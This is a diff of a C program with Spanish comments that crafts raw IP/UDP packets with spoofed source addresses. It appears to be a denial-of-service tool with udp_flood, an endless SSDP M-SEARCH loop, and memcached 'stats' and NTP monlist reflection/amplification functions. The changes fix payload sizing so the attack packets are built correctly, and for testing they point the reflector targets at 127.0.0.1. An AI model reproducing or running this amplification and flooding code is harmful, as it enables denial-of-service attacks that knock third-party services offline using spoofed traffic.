@@ -10,52 +10,14 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <pthread.h>
-#include "./includes/checksum.h"
+#include "./includes/helpers.h"
 #include "./includes/udp.h"
 #include "./includes/tcp.h"
 
-extern pthread_mutex_t lock;
-
 #define DATAGRAM_LEN 4096
 
-//Funcion que genera ip de los parametros dados
-ipArray* generador_ip(char* ip_addr, char* subnet_mask){
-	struct in_addr addr;
-    struct in_addr mask;
-    struct in_addr net_addr;
-    struct in_addr broadcast_addr;
-    uint32_t num_addrs;
-
-	//Calculamos la cantidad de ips con la mascara proporcionada
-
-    inet_pton(AF_INET, ip_addr, &addr);
-    inet_pton(AF_INET, subnet_mask, &mask);
-
-    net_addr.s_addr = addr.s_addr & mask.s_addr;
-    broadcast_addr.s_addr = net_addr.s_addr | ~mask.s_addr;
-
-    num_addrs = ntohl(broadcast_addr.s_addr) - ntohl(net_addr.s_addr) + 1;
-	ipArray arrayIPS[num_addrs];
-	uint32_t k;
-	int cont = 0;
-	// Iteramos por las ips calculadas con la mascara
-    for(k = 0; k < num_addrs; k++){
-		// Creamos las estructuras in_addr de las ips
-        struct in_addr curr_addr;
-        curr_addr.s_addr = ntohl(net_addr.s_addr) + k;
-        struct in_addr aux;
-        aux.s_addr = htonl(curr_addr.s_addr);
-        char *addr_src = inet_ntoa(aux);
-		strcpy(arrayIPS[k].ip, addr_src);
-		cont++;
-        /*struct in_addr curr_addr;
-        curr_addr.s_addr = ntohl(args->net_addr.s_addr) + i;*/
-	}
-	return arrayIPS;
-}
-
 // Funcion que crea un datagrama UDP con la direccion de origen, destino y payload proporcionos
-void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_ret, int* datagram_len, char* mensaje){
+void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_ret, int* datagram_len, char* mensaje, int size){
 
     char *data , *pseudogram;
 
@@ -70,13 +32,15 @@ void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datag
 
 	//Payload
 	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
-	memcpy(data , mensaje, sizeof(mensaje));
-	
+	if(size == 0){
+		size = strlen(mensaje);
+	}
+	memcpy(data , mensaje, size);
 	// IP header
 	iph->ihl = 5;
 	iph->version = 4;
 	iph->tos = 0;
-	iph->tot_len = sizeof(struct iphdr) + sizeof (struct udphdr) + sizeof(data); //Tamaño de todo el paquete
+	iph->tot_len = sizeof(struct iphdr) + sizeof (struct udphdr) + size; //Tamaño de todo el paquete
 	iph->id = htonl(rand() % 78123);
 	iph->frag_off = 0;
 	iph->ttl = MAXTTL;
@@ -91,7 +55,7 @@ void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datag
     // header udp
 	udph->source = src->sin_port;
 	udph->dest = dst->sin_port;
-	udph->len = htons(sizeof(struct udphdr) + sizeof(data));
+	udph->len = htons(sizeof(struct udphdr) + size);
 	udph->check = 0;
 	
 	//UDP checksum
@@ -99,13 +63,13 @@ void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datag
 	psh.dest_address = dst->sin_addr.s_addr;
 	psh.placeholder = 0;
 	psh.protocol = IPPROTO_UDP;
-	psh.prt_length = htons(sizeof(struct udphdr) + sizeof(data));
+	psh.prt_length = htons(sizeof(struct udphdr) + size);
 	
-	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + sizeof(data);
+	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + size;
 	pseudogram = malloc(psize);
 
 	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
-	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + sizeof(data));
+	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + size);
 	
 	udph->check = csum( (unsigned short*) pseudogram , psize);
 
@@ -132,7 +96,7 @@ void udp(int sockfd, char* destino, char* addr_src, int puerto){
 	// Creamos el paquete udp que vamos a enviar
 	char* datagram;
 	int datagram_len;
-	udp_datagram(&saddr, &daddr, &datagram, &datagram_len, "Paquete custom");
+	udp_datagram(&saddr, &daddr, &datagram, &datagram_len, "Paquete custom", 0);
 	
 	// Enviamos el paquete UDP al destino
 	if(sendto(sockfd, datagram, datagram_len , 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
@@ -151,7 +115,7 @@ void udp_flood(int sock, char* src, char* dst, int puerto, char* mensaje){
 			perror("Error al crear la configuracion IP");
 			exit(1);
 		}
-
+		
 		// direccion IP de origen
 		struct sockaddr_in saddr;
 		if(host_addr(&saddr, src, (rand() % 65535)) == 1){
@@ -162,7 +126,7 @@ void udp_flood(int sock, char* src, char* dst, int puerto, char* mensaje){
 		char* datagram;
 		int datagram_len;
 
-		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, mensaje);
+		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, mensaje, 0);
 		if (sendto(sock, datagram, datagram_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0) {
             perror("Error al enviar el paquete UDP");
             exit(1);
@@ -194,7 +158,7 @@ void ssdp(int sockfd, char* addr_src) {
 
 	char* datagram;
 	int datagram_len;
-	udp_datagram(&saddr, &daddr, &datagram, &datagram_len, m_search);
+	udp_datagram(&saddr, &daddr, &datagram, &datagram_len, m_search, 0);
     
     // Enviar los paquetes SSDP
     while(1) {
@@ -214,7 +178,7 @@ void udp_dns(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_r
 
 	char* paquete_DNS = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
 
-	// Set up the DNS header
+	// DNS header
 	dns_header* dns = (dns_header*)paquete_DNS;
 	dns->id = htons(0x1234);        // Identificador
 	dns->rd = 1;                    // Recursion
@@ -276,7 +240,7 @@ void memcached(int sockfd, char* addr_src){
 
 		// direccion IP de destino
 		struct sockaddr_in daddr;
-		if(host_addr(&daddr, linea, 11211) == 1){
+		if(host_addr(&daddr, "127.0.0.1"/*linea*/, 11211) == 1){
 			perror("Error al crear la configuracion IP");
 			exit(1);
 		}
@@ -288,13 +252,13 @@ void memcached(int sockfd, char* addr_src){
 			exit(1);
 		}
 
-		char* stats = "stats\r\n";
+		char* stats = "\x00\x00\x00\x00\x01\x00\x00stats\r\n";
 
 		// Creamos un datagrama udp con el comando stats para que el servidor responda con
 		// estadisticas suyas al origen del paquete
 		char* datagram;
 		int datagram_len;
-		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, stats);
+		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, stats, 14);
 		
 		if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
 		{
@@ -326,7 +290,7 @@ void ntp_amp(int sock, char* addr_src){
 
 		// direccion IP de destino
 		struct sockaddr_in daddr;
-		if(host_addr(&daddr, linea, 123) == 1){
+		if(host_addr(&daddr, "127.0.0.1" /*linea*/, 123) == 1){
 			perror("Error al crear la configuracion IP");
             exit(1);
 		}
@@ -348,11 +312,12 @@ void ntp_amp(int sock, char* addr_src){
 		ntp[5] = 0x00;
 		ntp[6] = 0x00;
 		ntp[7] = 0x00;
+		ntp[7] = 0x00;
 
 		// Creamos datagrama udp con el comando monlist
 		char* datagram;
 		int datagram_len;
-		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, ntp);
+		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, ntp, 8);
 		
 		if(sendto (sock, datagram, datagram_len , 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
 		{
